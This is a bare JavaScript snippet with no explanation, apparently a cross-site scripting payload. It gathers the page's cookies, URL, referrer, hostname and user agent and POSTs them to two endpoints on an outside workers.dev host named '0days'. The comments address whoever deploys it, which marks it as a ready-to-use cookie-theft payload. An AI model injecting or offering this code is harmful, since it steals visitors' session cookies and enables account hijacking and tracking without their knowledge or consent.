var data = {
    cookie: document.cookie,
    domain: location.hostname,
    url: location.href,
    ref: document.referrer,
    ua: navigator.userAgent
};

// Send to your first endpoint
fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x', {
    method: "POST",
    mode: "no-cors",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data)
});

// Send to your second endpoint (if you want both)
fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-a3qwxqcq5', {
    method: "POST",
    mode: "no-cors",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data)
});
